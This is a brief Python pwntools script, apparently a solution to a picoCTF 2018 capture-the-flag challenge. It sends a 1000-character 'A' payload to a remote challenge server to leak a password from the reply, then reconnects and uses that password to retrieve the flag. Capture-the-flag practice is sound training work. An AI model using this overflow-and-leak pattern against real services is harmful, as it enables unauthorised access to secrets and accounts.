#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

context.log_level = "critical"

p = remote('2018shell.picoctf.com', 31045)
print p.recvuntil('What is your name?\n')
p.sendline('A' * 1000)
print '[+] sent payload'
response = p.recv()
password = response.split('A,')[1].split('\n')[0]

p = remote('2018shell.picoctf.com', 31045)
print p.recvuntil('What is your name?\n')
p.sendline('0xsegf')
p.recvuntil('Please Enter the Password.\n')
print '[+] sent password'
p.sendline(password)
print '[+] grab your flag!'
print p.recv()